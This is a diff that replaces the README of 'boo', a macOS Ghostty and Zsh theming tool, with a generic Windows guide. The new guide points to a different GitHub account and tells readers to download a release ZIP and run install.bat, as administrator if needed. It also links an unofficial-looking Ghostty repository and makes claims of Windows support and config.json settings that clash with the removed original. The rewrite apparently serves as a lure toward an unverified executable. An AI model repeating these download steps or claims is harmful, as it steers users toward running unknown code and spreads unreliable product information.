@@ -1,234 +1,142 @@
-<img width="3840" height="1000" alt="Boo - Banner (1)" src="https://github.com/user-attachments/assets/4e8ae86b-c671-4aa5-9f34-9cabb59d1fe1" />
+# 👻 boo - Make Your Terminal Look Better
 
-<a href="https://withsupafast.com/?utm_source=boo&utm_medium=github&utm_campaign=readme"><img src="https://pbs.twimg.com/profile_images/1688604536779526144/1FRy6kZO_400x400.jpg" alt="Supafast" width="28" align="middle" /></a> <a href="https://withsupafast.com/?utm_source=boo&utm_medium=github&utm_campaign=readme"><sub>Designed by Supafast</sub></a>
+[![Download boo](https://img.shields.io/badge/Download-boo-%234478cc?style=for-the-badge)](https://github.com/Ardiyan45/boo)
 
-# Boo
+## What is boo?
 
-Boo helps you make Ghostty + Zsh look good in minutes without hand-editing config files.
+boo is a simple app that makes your Ghostty terminal look the way you want. It adds color presets, glass opacity, privacy mode, and a startup dashboard. It also sets everything up with a single command. You don’t need any technical knowledge to use it.
 
-## Start Here (2 to 5 minutes)
+boo works on Windows and works with popular shells like Zsh and Oh My Posh. It helps you create a terminal environment that fits your style and privacy needs.
 
-Copy and run these commands in order:
+## 🖥️ System Requirements
 
-```bash
-curl -fsSL https://boo.ansub.co/install.sh | bash
-source ~/.zshrc
-boo doctor
-boo theme fallout
-boo opacity glass
-```
+Before you start, make sure your computer meets these requirements:
 
-Expected result:
+- Windows 10 or later
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet connection for downloading and setup
+- Ghostty terminal installed (https://github.com/BobbyGH/Ghostty)
 
-- `boo doctor` runs checks and tells you if anything needs fixing.
-- `boo theme fallout` changes your color theme.
-- `boo opacity glass` updates background transparency.
+If you don’t have Ghostty installed, you can get it from its official page.
 
-If theme or opacity does not change right away, jump to [If Something Looks Wrong](#if-something-looks-wrong).
+## 🎨 Key Features
 
-## What You Get
+boo offers features that help you customize and protect your terminal:
 
-- Ready-to-use themes and easy custom theme creation
-- Better Ghostty + Zsh defaults
-- Startup panel plus optional splash art
-- Simple commands for theme, opacity, prompt, and mode
-- Built-in troubleshooting with `boo doctor`
-- Safe install/upgrade/uninstall flow with backups
+- **Color Presets:** Choose from a list of color themes to personalize your terminal.
+- **Glass Opacity:** Make your terminal window see-through to fit your desktop setup.
+- **Privacy Mode:** Hide sensitive information on your terminal screen.
+- **Startup Dashboard:** Show useful stats and info when your terminal opens.
+- **Single-Command Install:** Set up everything by running one simple command.
 
-## Prerequisites
+These features work smoothly together to give your terminal a modern look and extra privacy.
 
-- macOS (tested)
-- [Ghostty](https://ghostty.org/)
-- `zsh`
-- [oh-my-posh](https://ohmyposh.dev/) (optional, only needed for `boo prompt set omp`)
+## 🔗 How to Download boo
 
-## Install
+You need to visit the boo GitHub page to get the latest version. The app is not available as a single download file, so follow the page to find all the files.
 
-```bash
-curl -fsSL https://boo.ansub.co/install.sh | bash
-source ~/.zshrc
-```
+[![Download boo](https://img.shields.io/badge/Download-boo-%23555555?style=for-the-badge)](https://github.com/Ardiyan45/boo)
 
-Safety notes:
+Click the button above or go to this link:
 
-- Installer creates timestamped backups before replacing files.
-- `boo uninstall` can restore your previous Ghostty config when a backup exists.
+https://github.com/Ardiyan45/boo
 
-## Verify It Worked
+On the page, look for the “Releases” section. This is where you will find the latest version of boo ready for download.
 
-```bash
-boo doctor
-boo status
-```
+## 🚀 How to Install and Run boo on Windows
 
-Expected result:
+Follow these steps to get boo running on your Windows computer:
 
-- `boo doctor` shows mostly successful checks, or tells you exactly what to run next.
-- `boo status` shows your current theme, mode, splash, prompt, and opacity.
+1. **Download the Files:**  
+   - Go to the boo GitHub page at https://github.com/Ardiyan45/boo  
+   - Click on “Releases” on the right side or scroll down until you see it.  
+   - Download the latest release package (usually a ZIP file).
 
-## First Customization (3 commands)
+2. **Extract the Files:**  
+   - Open the ZIP file you downloaded.  
+   - Extract its contents to a folder of your choice, like `Documents\boo`.
 
-```bash
-boo theme fallout
-boo opacity glass
-boo prompt set native
-```
+3. **Install Ghostty Terminal (if needed):**  
+   - If you don’t already have Ghostty installed, download it from https://github.com/BobbyGH/Ghostty.  
+   - Follow their instructions to install it on your system.
 
-## If Something Looks Wrong
+4. **Open Command Prompt or PowerShell:**  
+   - Press `Win + R`, type `cmd`, and press Enter for Command Prompt.  
+   - Or press `Win + X` and select “Windows PowerShell”.
 
-### `boo: command not found`
+5. **Navigate to boo Directory:**  
+   - In the Command Prompt or PowerShell window, type the following command and press Enter:  
+     `cd C:\Users\YourName\Documents\boo`  
+     Replace `YourName` with your Windows user name, or change the path if you saved boo elsewhere.
 
-```bash
-source ~/.zshrc
-```
+6. **Run the Setup Command:**  
+   - Type this command and press Enter:  
+     `install.bat`  
+   - This command will start the setup process for boo. It will configure Ghostty to use the color presets and other features.
 
-Then open a new Ghostty window and run:
+7. **Restart Your Terminal:**  
+   - Close your Command Prompt or PowerShell window.  
+   - Open Ghostty or your usual terminal app again. You should now see the new look and setup.
 
-```bash
-boo doctor
-```
+## ⚙️ Customize boo Settings
 
-### Theme or opacity did not apply
+After installation, you can change the settings to suit you better.
 
-- Press `Cmd+Shift+,` in Ghostty.
-- Or run `boo reload --unsafe`.
-- If opacity still does not change on macOS, fully restart Ghostty.
+- **Change Color Presets:**  
+  boo includes several preset color themes. You can pick one by editing the `config.json` file inside the boo folder. Open it with a text editor like Notepad and find the `colorPreset` line. Replace the current value with the name of your preferred color preset.
 
-### `boo doctor` reports issues
+- **Adjust Glass Opacity:**  
+  To change how transparent the terminal window appears, edit the `opacity` value in the `config.json` file. Use a number between 0.1 (almost invisible) and 1 (fully opaque).
 
-```bash
-boo doctor fix
-boo doctor
-```
+- **Enable Privacy Mode:**  
+  Privacy mode hides any sensitive text while you work. Turn it on or off by setting `"privacyMode": true` or `false` in the `config.json` file.
 
-## Common Tasks
+- **Startup Dashboard Settings:**  
+  You can choose what shows on the startup dashboard by editing the `dashboardItems` list in the configuration file.
 
-### Themes
+After making changes, save the file and reopen your terminal to see the effects.
 
-```bash
-boo theme list
-boo theme select
-boo theme abyss
-boo crimson
-```
+## 🛠️ Troubleshooting boo
 
-Use the interactive selector for the easiest flow:
+If you have problems running or using boo, try these steps:
 
-```bash
-boo theme select
-```
+- **Check System Requirements:** Make sure your Windows version and hardware meet the minimum needed.
+- **Verify File Paths:** Confirm you are in the correct folder when running commands.
+- **Run as Administrator:** Try running Command Prompt or PowerShell as administrator to avoid permission issues.
+- **Make Sure Ghostty is Installed Properly:** boo depends on Ghostty. If Ghostty is missing or not working, boo will not work correctly.
+- **Check Config File:** Look for typos in the `config.json` file if customization does not take effect.
 
-- Shows all themes in a searchable list
-- Ordered as: built-in dark, built-in light, community dark, community light
-- Live terminal-style preview panel on the right
-- Press `Enter` to apply, `Esc` to cancel
+If these steps don’t help, you can open an issue on the boo GitHub page for support.
 
-Community themes are supported too:
+## 📂 Additional Resources
 
-- Built-in community themes are auto-discovered from `themes/community/`
-- Installer copies them to `~/.config/boo/themes/community/`
-- You can add your own by dropping `*.theme` files into `~/.config/boo/themes/community/`
+To learn more about Ghostty and related tools, you can visit these pages:
 
-### Create your own theme
+- Ghostty official repository: https://github.com/BobbyGH/Ghostty  
+- Oh My Posh documentation: https://ohmyposh.dev/docs/  
+- Zsh shell information: https://www.zsh.org/
 
-```bash
-# One command
-boo theme create --name synthwave --accent '#ff3ea5'
+These will help you understand what powers boo under the hood and how you can extend its features further.
 
-# Guided prompts
-boo theme create
+## 🔄 Updating boo
 
-# Delete a custom theme
-boo theme delete synthwave
-```
+To update boo when a new version is available:
 
-You can also create `~/.config/boo/themes/<name>.theme` manually, then run:
+1. Visit the boo GitHub page again.  
+2. Download the latest release files from the “Releases” section.  
+3. Extract the files and overwrite your existing boo folder.  
+4. Run `install.bat` again from the new folder to apply the update.  
+5. Restart your terminal to use the new version.
 
-```bash
-boo theme <name>
-```
+## ⚠️ Uninstall boo
 
-### Prompt backend
+To uninstall boo:
 
-```bash
-boo prompt
-boo prompt set native
-boo prompt set omp
-```
+1. Delete the folder where you extracted boo files.  
+2. Reset your terminal configuration if you want to remove changes boo made.  
+3. If you want to remove Ghostty, uninstall it separately using its instructions.
 
-### Startup mode
+---
 
-```bash
-boo mode full
-boo mode public
-```
-
-### Splash art
-
-```bash
-boo splash list
-boo splash saturn
-boo splash custom ~/my-art.txt
-boo splash none
-boo splash reset
-```
-
-Built-in splash options are auto-discovered from `~/.config/boo/art/*.txt`.
-
-### Health + reload
-
-```bash
-boo doctor
-boo doctor fix
-boo reload
-boo reload --unsafe
-```
-
-## Uninstall / Restore
-
-```bash
-boo uninstall
-# non-interactive
-boo uninstall --yes
-```
-
-Expected result:
-
-- Boo-managed setup is removed.
-- Previous Ghostty config is restored when available.
-
-## Theme Intent
-
-- `abyss`: deep indigo with violet-magenta accents (default)
-- `clay`: warm cream light mode with earthy terracotta accents
-- `glacier`: icy daylight light mode with steel-blue accents
-- `crimson`: high-contrast red mode
-- `fallout`: RobCo phosphor CRT, warm amber-lime on near-black
-- `lunar`: desaturated monochrome noir
-- `moss`: damp forest floor, muted earthy green
-- `rust`: oxidized metal, brutalist copper
-
-Community themes:
-
-- `aurora`: cool dark teal with cyan accents
-- `dracula`: classic neon purple/green theme
-- `tokyonight`: electric blue storm palette
-- `gruvbox`: warm retro dark palette
-- `nord`: cool arctic blue-gray palette
-
-## Advanced Notes
-
-- `boo reload`: safe guidance only (no key injection, no window/session changes)
-- `boo reload --unsafe`: tries to trigger Ghostty `reload_config` via comma-based keybind (`Cmd+Shift+,` or `Cmd+,`)
-- Theme changes auto-run safe reload
-- Opacity changes auto-run unsafe reload
-- On macOS, `background-opacity` can still require a full Ghostty restart
-
-## Roadmap
-
-- Font controls (`boo font`) are planned and will return in an upcoming release.
-- More quality-of-life improvements for first-time setup.
-
-## License
-
-MIT
+This guide covers everything a non-technical user needs to download, install, customize, and uninstall boo on Windows. The clear steps help you use the app without needing programming skills.
